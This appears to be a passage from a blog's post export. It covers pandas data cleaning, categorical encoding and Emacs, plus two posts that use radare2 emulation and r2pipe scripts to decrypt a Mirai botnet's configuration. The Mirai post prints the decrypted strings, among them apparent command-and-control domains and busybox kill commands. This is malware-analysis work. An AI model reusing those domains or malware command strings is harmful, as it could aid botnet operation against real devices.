logic. pandas has apply function which takes a function as a parameter, this function has the algorithm that runs on data to get derived value, apply function iterate thought each row and run the function passed on each element of the column. 123In [1]: titanic_df = pd.read_csv('../input/train.csv')# run apply function on Name column of the data-setIn [2]: titanic_df['surname'] = titanic_df['Name'].apply(lambda x : x.split(' ')[-1]).unique() Variables are stored in both rows and columnsVariable stored in the column is the problem we have solved be before then why does is need another section to discuss it again. This is because if the variable is in the row then there will be a column which will hold the value of that variable, and that column will be sort of variable itself. Let take an example of Global Historical Climatology Network for one weather station (MX17004) in Mexico for five months in 2010. Solution to this problem is to file melt the columns on the value columns using pandas melt function and then pivot the table on the row which has the variables element column for this example using pandas pivot_table method. Below is the code 12345678910111213141516171819In[1]: station_df = pd.read_csv('station.csv')In[2]: station_df = station_df.melt(id_vars=['year','month','element'], value_vars=['d1','d2','d3','d4','d5','d6','d7','d8'], var_name='day', value_name='temperature')In[3]: station_df.rename(columns={'variable':'day','value':'temperature'},inplace=True)In [4]: station_df.head()Out[4]: year month element day temperature0 2010 1 tmax d1 30.01 2010 1 tmin d1 3.02 2010 2 tmax d1 45.03 2010 2 tmin d1 34.24 2010 3 tmax d1 NaN# remove the d from the day variable and convert it into integerIn[5]: station_df['day'] = station_df['day'].apply(lambda x: x.replace('d',''))# this will create dataframe in hierarchical index since there# multiple index column specified in the index paramsIn[6]: station_df.pivot_table(index=['year','month','day'], values='temperature', columns='element')# remove hierarchical indexIn[7]: station_df.reset_index(inplace=True) below are the first few rows of the cleaned data element year month day tmax tmin 0 2010 1 1 30.0 3.0 1 2010 2 1 45.0 34.2 2 2010 2 2 27.3 14.4 3 2010 2 3 24.1 14.4 4 2010 2 6 20.0 21.0 Multiple types of observational units are stored in the same tableThis kind of problem arises due to the fact that multiple types of observation units are stored in the same table, this leads to the problem of duplicate values in dataframe so much so that size of the dataframe increases considerably. This concept is similar to that of database normalization where each fact is expressed in one place and if that fact has to be used somewhere else then the reference ID of that table is used. let take an example of the billboard weekly ranking of the songs dataset set, this dataset has two type of observation unit, the songs and the weekly ranking. This is the reason there is repetition in values of artist, tract and time variables. We need the break down this dataset into two dataframe songs and weekly rank 1234567891011121314151617In [1]: weekly_rank_df = pd.read_csv('songs.csv')# these are the repeated columns that we want to separate it# out in other dataframeIn [2]: new_table_cols = ['artist', 'track', 'time']# separate out the songs from the weekly ranks# and drop duplicate entries in songs dataframeIn [3]: songs_df = weekly_rank_df[new_table_cols].drop_duplicates()# remove old index value inherited from old weekly_rank tableIn [4]: songs_df.reset_index(inplace=True, drop=True)# get a new index values unique for each songsIn [5]: songs_df.reset_index(inplace=True)# give a good name to the index variableIn [6]: songs_df.rename(columns={'index':'song_id'}, inplace=True)# merge both the dataframe to assigned song_id to each weekly_rankIn [7]: weekly_rank_df = pd.merge(weekly_rank_df, songs_df, on=new_table, how='inner')# remove the columns of the songs dataframe from the weekly ranks dataframeIn [8]: weekly_rank_df.drop(columns=new_table_cols, inplace=True) A single observational unit is stored in multiple tablesIt’s not very unusual to find this kind of problem same observation unit is spread across the various database, file format or different file, usually they are separated by another variable like the year, person etc. For example, the baby dataset top 129 name is in a different file, each file for a year so essentially each file depicting the year variable. Combining the data is not much difficult if the data source but the variable names remain consistent, but it becomes challenging when the data structure changes over time. Nonetheless, pandas is the perfect tool to deal this kind of problem for the following reason: It has methods to import data from a various source. You can find pandas.read*_ functions that can import data from JSON, csv, database and various other file formats. once we have imported the data in the dataframe pandas has various indexing mechanics like multilevel, hierarchal indexing to pick the observations of interest based on some value of the indexed variable. pandas also have methods to merge different dataframe based on their indexing, as we discussed in the previous point indexing can not necessarily be a number but can be any shared variables of choice. ConclusionWe saw what a messy data is and defined what a tidy data should look like. We also discussed 5 most common problems of messy data and for each problem we discussed the messy table structure and who how we can fix it using few lines of pandas library. Useful Links Tidy Data - Journal of Statistical Software Tidy data blog post Amazon Public data-set More Data set","link":"/2017/12/04/data-cleaning-in-python-using-pandas/"},{"title":"Decrypting Mirai configuration With radare2 (Part 2)","text":"This is the third part of the three-part series about code Emulation for Reversing Malware :Part 1 describes how to use radare2 function emulation along with an exercise of cracking password of function implemented using radare2 python scripting plugin r2pipe.Part 2 describes how to use the feature to decode a configuration of a Mirai IOT botnet, by implementing the solution in radare python scripting capabilities.Part 3 improves the script created in the previous by adding more features of searching for addresses of encrypted string and creating function signature to search for decryption function instead of using the hard-coded address of the function. In the previous two posts we looked at how to emulate a string decryption function call and we created a radare2 macro and python script to use that emulation, we also managed to decrypt some configuration, but not all. In this post we will continue to improve the script, we will continue with the problem finding the address of encrypted data in the previous post and use those address to decrypt the configuration. There another interesting problem I came across when testing this script on the other variant of Mirai samples, the decryption function was not present at the same address as in the previous binary, all thought the function implementation was the same, well I managed to fix that by creating function signature other cool feature of radare. We will also explore many other features improve the script and make it more portable such that if the sample is using the same decryption method then our python script should be able to decrypt the configuration. Let get right into it. Data Reference Search MethodIf you have paid a close attention to the reversing of the encryption function in the previous post, you would have argued that we took the wrong approach of decrypting the configuration, instead of setting the configuration struct on stack and changing the register values we could have just past the configuration index as argument and the rest would have been taken care by the function emulation. I would agree with you, but that would be true if the whole array of structures was already in place at that memory, but that was not the case. These array of the data structure is created at run-time. Let’s see in radare what is present at that location address 0x08052800 which is the base address of the data structure. As you can see there are lots of references round this memory location pointed out by DATA XREFS from there is lots of reference from sub.7_1_700(address 0x804d700), let’s see what’s there. As you can see there are lots of references to global data, maybe its copying the encrypted string and its length. You can see this pattern push one byte and push the global reference address and push register and call to a function. coping string from one location to other location and the length is passed as parameter let disassemble that function (address 0x0804e0f0). Maybe this function(address 0x0804e0f0) coping string from one location to other location and the length is passed as a parameter. As you can see there is a loop and this loop is coping byte from edx + ebx to edx + esi edx been the loop counter variable. So we can conclude that this is a memory copy function. Question is why not use the standard library memory copy function? that because standard library function might not be available on all Linux environment remember this malware is trying to run on all the possible devices running Linux, not all environment might not have the luxury of libc standard functions, there might be many other such functions which mimic the standard C run-time function. Let’s go back to the function we came from. Now that we know that there are global data been referenced from this function lets find all the data reference form this function and see if using these addresses we can get any meaningful string. To get all the data references from this function we can use agaj command this will give us the result in json format. This command returns the global referenced address in the title field of the json and we are not interested in other fields. Below is the python code to iterate this json and run decryption function on these global references. 12345678910111213141516# start address of the function sub.7_1_700config_addr_start = '0x0804d700'# end address of the function sub.7_1_700config_addr_end = '0x0804e080'r.cmd('s '+config_addr_start)# data references as json arraydata_refs = r.cmdj('agaj')# get all the address as array from the title field of the jsondata_refs = map(lambda y : y['title'], data_refs['nodes'])for str_addr in data_refs: print(emu_decrypt(str_addr)) This is the output we get. 123456789101112131415161718192021222324+\\xfb\\x94l\\x12l\\x90\\x8doxx\\xfb\\xbct\\xf1\\xbb\\x12l\\x10\\xc0v}p(\\x90\\xabzantari.duckdns.orgOGISyourdady.duckdns.org\\x15\\xb3x\\xfc\\xa1xKuasa Menjejaskan Anda\\xfc\\xa1xKuasa Menjejaskan AndaKuasa Menjejaskan Anda/proc//exe/fd/proc/net/tcp/maps/status.anime/proc/net/route/proc/cpuinfoBOGOMIPS/etc/rc.d/rc.localg1abc4dmo35hnp2lie0kjfassword/dev/watchdog/dev/misc/watchdog/dev/FTWDT101_watchdog/dev/FTWDT101 watchdog/dev/netslink/ As you can see there are lots of meaningful string like domain names, /proc/* etc which were not decrypted by earlier string reference method. But there are other configurations which were present in the previous method but not in this method, that means we still don’t have the full configuration we can use the combination of both the method or we could try another method as shown in the next section. Assembly Search MethodEarlier we saw there was a push, push, push and call pattern to copy the encrypted string from one address to another we could find all the push instruction and extract the address from that instruction and try to decrypt the data at that address. Again, we can use the instruction search functionality which we used in the previous post to find all the push type of instruction, for that we will use /atj push to search all push function and return the result in json format. Before searching we first have to adjust the limit of search to just this function or else radare2 will search push instruction in whole binary we can do that with e search.to and e search.from configuration. We will set the from and to of configuration to start and end of function respectively. Below is the python code to do what we just discussed. 1234567891011121314151617# start address of the function sub.7_1_700config_addr_start = '0x0804d700'# end address of the function sub.7_1_700config_addr_end = '0x0804e080'# adjust the limit of searchr.cmd('e search.from = '+config_addr_start)r.cmd('e search.to = '+config_addr_end)push_list = r.cmdj('/atj push')for inst in push_list: if inst['size'] == 5 : data_offset = inst['opstr'].replace('push ','') print(emu_decrypt(data_offset)) the output of this method is as below. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354zantari.duckdns.orgOGISyourdady.duckdns.org\\x15\\xb3x\\xfc\\xa1xKuasa Menjejaskan Anda\\xfc\\xa1xKuasa Menjejaskan AndaKuasa Menjejaskan Anda/proc//exe/fd/proc/net/tcp/maps/status.anime/proc/net/route/proc/cpuinfoBOGOMIPS/etc/rc.d/rc.localg1abc4dmo35hnp2lie0kjfassword/dev/watchdog/dev/misc/watchdog/dev/FTWDT101_watchdog/dev/FTWDT101 watchdog/dev/netslink/V[OvWsGA4@F6FACDBAbAdiaGvPRIVMSGGETLOCALIPKILLATTKEats8/proc/self/exe\\x15\\x09\\x0ezu9&gt;4w9=3uZxshellshellenablesystemsh/bin/busybox kkuuaassaakkuuaassaa: applet not foundncorrectasswordoginenter/bin/busybox ps/bin/busybox kill -9TSource Engine Query/etc/resolv.confnameserver/dev/watchdog/dev/misc/watchdogox0PP2rRkIoK6qyZO166dvrHelperhttp As you can see there are lots of meaningful string this time we can see strings that were not present in both the earlier methods like busybox commands etc. Seems like push, push pattern is the best method. Now that we are able to decrypt the data let now move the focus to make this script more portable i.e. try to remove the hardcoded address of the function and try to search those methods in the binary and used the discovered address instead. Creating and searching a function signatureTo search a function in a binary we first have to create a signature of the function we want to search, radare has its own format of signature. All the functionality related to signatures can be found by z? command. Anyways to creating a function signature is very simple all you have to do is seek to the function and type zaf [function_name] [signature_name] this will generate the signature for the function with that name. For our example, there are two functions for which we need to create the signature: zaf sub.7_1__700 config_func: this command creates the signature for the function which creates the configuration data structure which is used to find the addresses of the string of encrypted configuration, this will result in signature name config_func. zaf fcn.decrypt decrypt: this will create the signature for decryption function. Signatures can be saved to file with zos [filename] command and to reload the signature use zo [filename] command. We will later use this signature in our python script to search these functions start and end address. Searching the address of the function with signaturesNow to search the signature you will have to use z/ command and the resulting address can be found in sign flag space, address at which these functions are found are flagged as sign.bytes.[signature name]. To see the search results just switch to sign flag space by fs sign command and the use f command to list flag as the results. To get all the search result you can use the fj command to get all the address in json format will be used for our python script. The next task is to get the start and end address of the function which is done by the function below. It returns start address, the address of instruction where we set the base address of the configuration data structure and end address of the function. 12345678910111213141516171819202122232425262728293031323334353637def find_decryption_func(): func_sig = './mirai_decrypt_func.sdb' # load the signature file r.cmd('zo '+func_sig) # search for siguature func_srch_res = r.cmd('z/') # select signature flag space r.cmd('fs sign') # get all the flags in signature flag space func_srch_res = r.cmdj('fj sign') if len(func_srch_res) == 0: print('[-] Encryption function signature not found') return None print('[+] Encryption function signature found') # get the start address of the signature file func_start_addr = func_srch_res[0]['offset'] r.cmd('s '+str(func_start_addr)) # get function information func_info = r.cmdj('afij')[0] # calculate the function last instruction func_end_addr = func_start_addr + func_info['size'] # find the address of the instruction where we have to load # the base address of data structure, its the 9 instruction # from first instruction of the function halt_addr = r.cmdj('pdj 9')[-1]['offset'] # reset the flag space to global flags or you won't be able to # see any other search results , very important. r.cmd('fs *') return func_start_addr, halt_addr, func_end_addr Similarly, there is another function which searches for the function which has the references for all the data structure. 12345678910111213141516171819202122def find_config_func(): r.cmd('fs sign') func_srch_res = r.cmdj('fj sign') print(func_srch_res) srch_res = list(filter(lambda x : x['name'].find('config_func') &gt; 0, func_srch_res)) if len(func_srch_res) == 0 or len(srch_res) == 0: print('[-] Configuration function signature not found') return None print('[+] Configuration function signature found') func_start_addr = srch_res[0]['offset'] r.cmd('s '+str(func_start_addr)) func_info = r.cmdj('afij')[0] func_end_addr = func_start_addr + func_info['size'] r.cmd('fs *') return func_start_addr, func_end_addr# find function address in binaryconfig_addr_start, config_addr_end = find_config_func()func_start_addr, addr_of_halt , func_end_addr = find_decryption_func() This completes our script, we have discovered the function address and used it will last two lines of code. Partial code emulation take awayIn this experiment I have got into lots of trouble with running the emulation, so here are some of the debugging tips : Deep nested calls can have system calls which might not be emulated by radare which might hang up the execution. The uninitialized global variable used inside of function might hang up the emulation. Take care of byte ordering(Little/Big Endian) when setting up the structure on stack or else emulator might reference address outside its valid memory range. ConclusionThis post ends the three part series of partial code emulation feature of radare, we used this feature to decrypt the configuration of Mirai malware and we also saw how to make the script more portable by removing the hard-coded address of the functions and replacing it by signature-based search approach. We also saw some of the technique we used to find the address of the encrypted string, the point of this exercise was to explore other capabilities of radare.","link":"/2018/09/15/decrypting-mirai-configuration-with-radare2-part-2/"},{"title":"Emulating decryption function with radare2","text":"This is the first part of the three-part series about code Emulation for Reversing Malware :Part 1 describes how to use radare2 function emulation along with an exercise of cracking password of function implemented using radare2 python scripting plugin r2pipe.Part 2 describes how to use the feature to decode a configuration of a Mirai IOT botnet, by implementing the solution in radare python scripting capabilities.Part 3 improves the script created in the previous by adding more features of searching for addresses of encrypted string and creating function signature to search for decryption function instead of using the hard-coded address of the function. radare2 is reverse engineering tool that can be very useful to reverse engineer malware or any type of binary as it supports many CPU architectures. One of the most striking features I found about radare is the partial code emulation. I was initially sceptical about this feature what could it be actually used for but think it about for a while and playing with that feature I realized its potential, it’s simply amazing. lets consider frequent scenarios where, malware author encrypt the string in binary and decrypts these string just before using the string when running the code like, for example when you inspect the executable malware in PEView import won’t let you much besides LoadLibrary which helps you to load DLL library into the process and GetProcAddress helps you to resolve particular method in that library, as the malware is loading DLL and resolving functions manually. The imports section of the binary is empty and the functions are resolved dynamically, decryption of these function names is done before calling LoadLibrary and GetProcAddress, nothing fancy simple string obfuscation. A string can also give you the attack IP address/URL. Malware author may be using some encryption routine which you might have to reverse and write your own python script to replicate the algorithm and decrypt all those strings. And you might also have to go through the pain of locating those string and going back and forth between IDA and shell. We could have avoided static analysis of the malware string decryption routine if we could run that part of the binary by passing a parameter to that function and reading the decrypted sting from the memory. String decryption is not the only problem we have there is also a self-modifying code/shellcode which can be analyzed automatically. the radare emulator can do a lot more the monitoring CPU register and we can even modify register in the middle of execution. One thing to note is radare emulator is only partial code emulator it doesn’t emulate full OS so making system call and invoking system function isn’t going to work. Well, there are workarounds, but we need to keep this mind that requires some extra work. But usually, these decrypting functions are self-sufficient and not depending on external library functions. So let’s get right into it. Sample Decryption functionFor sake of simplicity I have created a simple C program which taken input strings, it decrypts the string and compares with string its looking for if the string is equal and we have cracked the code. Below this the for the challenge C code. 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;bool is_valid(char *user_input){ char *key_stub = &quot;isrveawhobpnutfg&quot;; char *solution = &quot;gaints&quot;; int index ; bool is_same = true; for(int i=0; i&lt;6; i++){ index = user_input[i] &amp; 0x0f; user_input[i] = key_stub[index]; if(key_stub[index] != solution[i]){ is_same = false; } } return is_same;}int main(){ char decrypted_stub[6] = &quot;oe0kma&quot;; bool ans = is_valid(decrypted_stub); if(ans){ printf(&quot;Passed\\n&quot;); }else{ printf(&quot;Failed\\n&quot;); } return 0;} Just to brush up the basic function parameter passing concepts, parameters are passed to function via the stack, there are two types of parameters either value directly copied on to the stack or a reference of the variable is passed on the stack. Reference is just a pointer variable which contains the address of the variable. When the function is done executing it return the result into eax/rax register. In memory, function’s first parameter can be found on ebp+0x8, the second parameter at ebp+0xc and so on for x86 32-bit machine. If we were to emulate the function call then we can set up the stack frame before calling the function and then run the function and read the value from the eax register, this way we have emulated the function. Setting up the VMBefore using the emulator we need to initialize it, providing the environment information like CPU architecture, and little/big-endian byte ordering, allocating a memory for stack etc. all this can be done with commands below e asm.bits=32 : specify this its a 32 bit address space e asm.arch=x86 : its x86 architecture aei: initialized the VM aeim: this command allocates a stack at memory address at address 0x100000 of size 0xf0000 this can be changed by passing it a parameter to the command s sym.is_valid : seek the current radare pointer to the start of function “is_valid”. aeip: this sets the current value of EIP with current seek. You use this command after you have seek to the function you are trying to emulate. pxw @ esp: this is just to see the stack in 32-bit word format. Setting up the StackIn our case we will write string on stack memory somewhere in higher memory address where we don’t overlap with the stack allocated memory for this particular function call and push there reference on top of stack of that memory address, this pushed reference of string is the parameter to the stack, this sets up the stack for the function call. w o0ekma @ 0x001780f0 : “w” command writes string “o0ekma” at memory address “0x001780f0”, this memory address is within the memory allocated by radare emulator. wx 0xf0801700 @ ebp+0x4 : “wx” command writes hex value “0xf0801700” at “ebp+0x4” address. There are couple things in this command that needs to be explained : Note that we are writing function parameter at “ebp+0x4” instead of “ebp+0x8” this is because when we call the function we have just push on the current EIP value on stack and function prologue “push ebp” is not executed yet, code after execution of function prologue refer its parameters using ebp+0x8, and so on. The address that we have written onto the stack is reversed of the address to which is the string was written to its because of the byte ordering as in x86 little endian, so we have to write the address in reverse order. stack data Register func param n EBP + 0xc func param 2 EBP + 0x8 func param 1 EBP + 0x4 callee EIP &lt;= SP when Emulator is initialized callee EBP caller local variables pxw @ esp: this command is just for visual examination of the stack, see if thing are as we expect it. now that we have done all the setup necessary for the execution, as an exercise I would recommend that you step through each instruction and observe the stack and register, this what the next command helps you to do so. aes; aer ; pxW 50 @ esp ; pd 10 @ eip : this command steps one instruction at a time and displays the stack, registers and next 10 assembly instruction set from current instruction. As you might have guessed this command is a combination of multiple commands separated by “;”, below is the explanation for each command. aes: single stepping the code aer: display all the register pxW 10 @ esp : displays stack (pointed by esp register) 10 bytes in hex 32 bit word format. pd 10 @ eip : disassemble 10 instruction from address aecu 0x5f1: single stepping each instruction is great for dynamic debugging but you might just want to run the code this the end of the function and just observe the return value. This is precisely what this command does “aecu [addr]” executes the code till the specified address and stops, then we can read off the value from eax register with “aer eax” command. now that we have the all the commands necessary to complete the challenge which we described earlier let use radare scripting to complete the task. Scripting the emulatorAs described in the challenge, the program decrypts the input string and compares it with the string if the value matches the function return true with the emulator we will try different inputs and observe the eax register which is the function return value, if the value is 1 then it means its true and 0 otherwise. There is a python binding for radare called “r2pipe” you can install it with pip. Below is the code to accomplish just what we described. 12345678910111213141516171819202122232425262728293031import r2pipedef check_val(user_input): r = r2pipe.open(&quot;./decode&quot;) # setting up VM r.cmd('aaa') r.cmd('e asm.emu=true') r.cmd('e asm.bits=32') r.cmd('e asm.arch=x86') # set all register to value 0 r.cmd('ar0') r.cmd('s sym.is_valid') r.cmd('aei') r.cmd('aeim') r.cmd('aeip') r.cmd('aer') # setting up stack for function call r.cmd('w {} @ 0x001780f0'.format(user_input)) r.cmd('wx 0xf0801700 @ ebp+0x4') r.cmd('aecu 0x000005f1') sol = int(r.cmd('aer eax'),0) if sol == 1: print('Found solution : ',user_input) else: print('Invalid user input : ',user_input)u_inputs = ['oe0kma','ashi','adsh','aasdf']for u_i in u_inputs: check_val(u_i) path of the binary is pass as the first parameter to function r2pipe.open it returns the instance, this initialized the radare instance to which the commands will be passed. radare instance has a function cmd to which we pass the string parameter, which is the command we described earlier, these commands may return values depending on the command which can be used to read memory or register like in case of aer eax. A nice thing about radare command is that it can even return command response in json format with by just specifying j in the command. for example, you can issue aerj command in it will return you all the registers as key in and its value as the register value. ConclusionWe saw how we could use a function as a black box, feed input and monitor the output we could use the same functionality to decrypt obfuscated stings, by setting up appropriate function parameter and read the return value. In the next post, we will use the method to de-obfuscate Mirai botnet configuration.","link":"/2018/08/15/emulating-decryption-function-with-radare2/"},{"title":"Handling categorical features with python","text":"As a data scientist, you may very frequently encounter categorical variable in your dataset like location, car model, gender, etc. You cannot directly use them in our machine learning algorithm as these algorithms only understand numbers. There are various techniques to convert these categorical features to numerical features but that is not the focus of this post, this post is about how to implement these techniques in python. I will talk a little bit about these techniques but won’t go into too much depth, I will emphasise more on various ways how you can implement this technique in python. What are Categorical variables?Categorical variables are the qualitative variables which have non-numeric values like gender it can either be male/female value, even if they are numerical values feature description says it’s categorical that means these numerical values are not mathematically related. Sometimes the answer to the questions is like yes/no, ugly/nice/ok/pretty, good/bad, etc. We can say that answer to the question is from the set of predefined possibilities. Qualitative/categorical variables take values from these set of possibilities. These variables often prove to be of great importance and can boost the accuracy of the model to a considerable extent. There are two types of categorical variable : Ordinal/Ordered categorical variableOrder of these type of variables matter, for example, movie review values can be good, average and bad in this case average is between good and bad, rank result of a race, in such cases order of variable have some information and if the order is not followed can produce misleading results. Nominal categorical variableFor these type of variables order doesn’t matter, like the type of seat values can be economic/business, gender (male/female), etc. Order of the variable makes no difference in their interpretation.It depends on the data we have whether to interpret a categorical variable as nominal or ordinal, misunderstand the variable can lead to a false result. So it really important to think carefully before diving into implementation. Simple approach to encode categorical featuresThe two approaches which we are going to use to convert the categorical variable to its numerical equivalent form are as follows: Label EncodingA simple approach to convert categorical variable to numerical variable will to assign a unique number to each possible outcome of the variable and replace the variables values with its corresponding number. But this technique can only be used for the ordinal categorical variable, once you know the order of the values of the variable, as the order of the values matter the numbers assigned to values of categorical values should also be sorted in ascending or descending order, doesn’t matter which order you choose. So, for example, a movie review variable may have five possible in-order values (excellent, awesome, good, bad, burnt it) so assigned values for the outcome will be from 5 to 1, 5 been excellent and burn it been 1. In this case review variable, a value of one data point is 4 (awesome) and other data point is 2 bad and if we take average the outcome will be 3(good) which make sense. This might not be the case for the nominal variable which is why we cannot use this method for a nominal variable. One Hot Encoding/One of K schemeThe other approach is called the one hot encoding, where a categorical variable is converted into a binary vector, each possible value of the categorical variable becomes the variable itself with default value of zero and the variable which was the value of the categorical variable will have the value 1. This concept is explained with the example shown below. Table before applying one hot encoding transformation | name | gender | |–|–| | Roshan | male | | Anna | female| | Hussain | male | | Ashwini | female | Table after applying one hot encoding transformation | name | male | female | |–|–|–| | Roshan | 1 | 0 | | Anna | 0 | 1 | | Hussain | 1 | 0 | | Ashwini | 0 | 1 | Implementing Label EncodingWe saw what label encoding is above, not always you are going to get categorical variable in string form, it is possible you might even encounter random numerical values(this is typically the case in competitions) but still it’s a categorical feature. To deal with such situation there is a utility class LabelEncoder in preprocessing module in the sklearn package it can handle categorical variable in both numerical and string form. Fire-up a ipython console and try the code below 123456789101112131415161718192021&gt;&gt;&gt; from sklearn.preprocessing import LabelEncoder# encoding numerical values&gt;&gt;&gt; num_encoder = LabelEncoder()&gt;&gt;&gt; num_encoder.fit([3, 3, 4, 9])LabelEncoder()&gt;&gt;&gt; num_encoder.classes_array([3, 4, 9])&gt;&gt;&gt; num_encoder.transform([3, 3, 4, 9])array([0, 0, 1, 2])&gt;&gt;&gt; le.inverse_transform([0, 0, 1, 2])array([3, 3, 4, 9])# encoding string values&gt;&gt;&gt; city_encoder = LabelEncoder()&gt;&gt;&gt; city_encoder.fit(['mumbai', 'delhi', 'mumbai', 'pune'])LabelEncoder()&gt;&gt;&gt; list(city_encoder.classes_)['delhi', 'mumbai', 'pune']&gt;&gt;&gt; city_encoder.transform(['mumbai', 'mumbai', 'pune'])array([1, 1, 2])&gt;&gt;&gt; list(city_encoder.inverse_transform([1, 2, 1]))['mumbai', 'pune', 'mumbai'] Implementing One Hot Encoding/One of K-SchemeYou may encounter data in various form data type number/string to deal with these situations there are of utility classes in the sklearn package to convert them in one hot encoding schema. As we discussed earlier categorical variable could be in numerical or string data type, following are two methods to convert a categorical variable to one hot encoding schema: SKLearn wayOneHotEncoder utility class provided by the sklearn package can convert numerical values to one hot encoding but we can also deal with string values if use LabelEncoder along with the OneHotEncoder class. The labelencoder class will map the string values of the categorical variable to a number and these number can be converted to one hot encoding by OneHotEncoder. Implementation is shown by the code shown below 1234567891011121314151617181920212223242526272829303132333435In [1]: from sklearn.preprocessing import LabelEncoder, OneHotEncoderIn [2]: import pandas as pdIn [3]: raw_data = {'name': ['Roshan','Anna','Hussain','Ashwini'], 'gender': ['male', 'female', 'male', 'female']}In [4]: gender_encoder = LabelEncoder()In [5]: df_people['en_gender'] = gender_encoder.fit_transform(df_people['gender'])In [6]: df_peopleOut[6]: name gender en_gender0 Roshan male 11 Anna female 02 Hussain male 13 Ashwini female 0In [7]:one_hot_array = one_hot_gender.fit_transform(df_people.en_gender.values.reshape(len(df_people),1))Out[7]:array([[ 0., 1.], [ 1., 0.], [ 0., 1.], [ 1., 0.]])In [8]: df_people[gender_encoder.classes_] = pd.DataFrame(one_hot_array)In [9]: df_peopleOut[9]: name gender en_gender female male0 Roshan male 1 0.0 1.01 Anna female 0 1.0 0.02 Hussain male 1 0.0 1.03 Ashwini female 0 1.0 0.0 Pandas wayIf your data is already loaded in pandas then pandas.get_dummies is one very handy method to convert your categorical variable to one hot encoding schema, this method is much convenient then the previous sklearn approach. This method can convert multiple columns in one method call by passing data frame and the columns we want to transform. Below is the example to for what I have just explained. 12345678910111213141516171819202122232425262728293031323334353637383940In [1]: import pandas as pdIn [2]: raw_data = {'name': ['Roshan','Anna','Hussain','Ashwini'], ...: 'gender': ['male', 'female', 'male', 'female'], ...: 'location': ['delhi', 'delhi', 'mumbai', 'pune']} ...:In [3]: df_people = pd.DataFrame(raw_data, columns = ['name', 'gender','location'])In [4]: df_oh_p = pd.get_dummies(df_people, columns=['gender', 'location'])In [5]: df_oh_pOut[5]: name gender_female gender_male location_delhi location_mumbai \\0 Roshan 0 1 1 01 Anna 1 0 1 02 Hussain 0 1 0 13 Ashwini 1 0 0 0 location_pune0 01 02 03 1In [6]: df_people_new = pd.concat([df_people, df_oh_p], axis=1)In [7]: df_people_newOut[7]: name gender location name gender_female gender_male \\0 Roshan male delhi Roshan 0 11 Anna female delhi Anna 1 02 Hussain male mumbai Hussain 0 13 Ashwini female pune Ashwini 1 0 location_delhi location_mumbai location_pune0 1 0 01 1 0 02 0 1 03 0 0 1 We discussed two libraries sklearn and pandas which helps us to deal with the categorical variable, which one should you prefer? If you prefer sklearn way then you get advantage of chaining transformers and estimators in PipeLine and FeatureUnion to create data pipelines which can makes your whole analysis more manageable, while if you go pandas way you get the simplicity but you will have to implement custom transformer and then chain it in _PipeLine and FeatureUnion. ConclusionWe saw the different type of categorical variable and how to encode them so that we can use them in machine learning algorithm along with other feature. You could write your own code to convert the categorical variables in numerical variable but you could leverage existing helpful utility classes/methods provided by some popular ML libraries which can come handy and can save some time in the cleaning of dirty data. Useful links Feature extraction sklearn docs What is one hot encoding and when is it used in data science? on Quora OneHotEncoder sklearn API docs LabelEncoder sklearn API docs pandas.get_dummies API docs sklearn Pipeline and FeatureUnion","link":"/2017/10/14/handling-categorical-features-in-python/"},{"title":"Lets Emacs in 21st Century","text":"Text processing software also called editor (by coders) are very important part of programmers or a writers day to day activity. Optimizing your workflow can help you to be more productive. Don’t confuse productivity with getting more work done, it actually quite the opposite. It’s about getting the same amount of work done in less time and effort and in the best case getting more work done with even less effort. So by this definition of productivity, our editor should help us to produce the same amount of work with less keystrokes. There are lots of editors out that which are trying to help you be more productive but nothing comes close to Emacs. Emacs is an editor you can program and customize the way you want. The purpose of this post is to motivate you to get started and evangelize you to make Emacs as your primary editor. MotivationWell I have tried to adopt Emacs as my primary editor before but I fall on my face multiple time for one reason I DIDN’T HAVE ENOUGH PATIENCE that Emacs demands, but this time I had a couple of strong reasons for which the I am ready to pay the price which Emacs demanded, there were those reason which made me switch to Emacs or better yet give it another shot : Portability of configuration : your editor configurations are defined in one place which can be exported or backed up. I recently had to format my machine and I was using Atom as my main editor unfortunate it didn’t have the option to export all the plugin which I had installed and the configured, I was furious as had worked on my plugin and configuration and doing it all again boiled my blood. Emacs has a nice feature of specifying the configuration from which it picks up all the setting, it also has package manager from where you can install a plugin with just few commands. you can create a git repository of your configuration and back it up on Github. This all may sound trivial but when you will the see the changes of the Emacs configuration that you have done one machine to be reflected on your other machines it will be like a magic, all you have to do is just sync up you git repository. Emacs will take care of installing all the new packages and configuration. Productivity : Emacs discourages you to lift off your hand from the keyboard and use the mouse to carry out a task. Its nothing I Emacs has against mouse but switching back and forth between mouse and keyboard is so unproductive and irritating. There is nothing that you can’t do using keyboard shortcuts in Emacs, and if there is anything you are doing using a mouse in Emacs then you are probably doing it wrong and you need to figure it out how to do it with shortcuts or command. That’s the level faith I want to have it in my editor and you should too. Helps me to focus better and organize my task : in your daily workflow its not very unusual to get thoughts and idea that you feel like it needs your attention they might be some household chore you forgot or you where curious about Michael Jordan’s height, I get it these are all important matters but when you coding its important to focus on the work. The best way to deal with this situation is to make note of this thought, deal them when you have time and get back to your code. Capturing these thoughts in a very low friction way with your editor with just a small prompt would be great. That’s what exactly org-mode is for, it helps you to take notes, organize tasks, write books, journaling, etc list goes on and on. People have used org-mode in many creative ways. There is a lot to say about org-mode I will give more details about org-mode in later part of the post. Future proofness of the tools : The reason any software may die is, it is platform dependent, demand is no longer there and fails to evolve with and time and need. Well, Emacs seems to have survived all these reasons of extinctions. Emacs is cross-platform, there is still a large community of users who are using and improving the editor and Emacs is evolving for past 25 years. So probably this will be my editor for life. One place to use them all : one of the good things about Emacs is you can bring lots of daily used tools in it, in my case I have configured my email client, music player, git tool, and terminal in my Emacs which were different independent software earlier. The advantage of this approach is you can use the muscle memory that you have gained in other software’s as well and you don’t have to leave Emacs. Tips for the beginnerThis section is about my past mistakes which failed to adopt Emacs. I have explained how to not make those mistake. Its going to be frustrating to not remember all the shortcut key and you might even feel overwhelmed by all the gazillion shortcuts you have found on Google. But don’t worry it normal first-timer experience, you don’t have to remember it all and memorize it today. The first couple of weeks are going to be frustrating but you need to have patience. Once you have passed these first few weeks you will build the muscle memory that will put you on autopilot mode. Then you just have to think, your fingers will do the job for you without you even realizing. Read the tutorial which you see on the home page of freshly installed Emacs and download the reference the Emacs shortcut from here. Keep the file open and refer it when needed, which will be very frequent in the beginning but later you wouldn’t need it. Don’t just switch to Emacs right away. Make it a slow transition from your current editor to Emacs. Take it slow first week make it a target to do 10% of your work on Emacs, next week 20%, next 40%, keep the pace as you feel comfortable. But keep it consistent and increasing. Emacs by default comes with very basic configurations but you will have 